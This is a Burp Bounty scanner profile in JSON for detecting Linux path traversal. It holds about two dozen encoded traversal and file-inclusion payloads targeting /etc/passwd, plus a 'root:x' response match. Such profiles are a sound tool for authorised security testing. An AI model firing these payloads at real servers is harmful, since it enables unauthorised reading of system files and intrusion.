[
  {
    "ProfileName": "PathTraversal_Linux",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "/../../../../../../../../../../../../../../../../etc/passwd",
      "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
      "../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
      "/etc/passwd%00",
      "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
      ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd",
      "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
      "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
      "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
      "/../../../../../../../../../../../etc/passwd%00.html",
      "/../../../../../../../../../../../etc/passwd%00.jpg",
      "../../../../../../etc/passwd\u0026\u003d%3C%3C%3C%3C",
      "....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd",
      "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd",
      "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
      "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
      "Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA\u003d\u003d",
      "Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA\u003d\u003d",
      "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
      "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
      "%00../../../../../../etc/passwd",
      "%00/etc/passwd%00",
      "..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd",
      "..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd%00",
      "php://filter/zlib.deflate/convert.base64-encode/resource\u003d/etc/passwd"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x"
    ],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": true,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 3,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "PathTraversal_Linux",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt\u003cbr/\u003e\u003cbr/\u003e\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      65,
      32,
      36,
      1,
      2,
      6,
      5,
      35,
      34,
      64,
      0,
      3,
      4
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]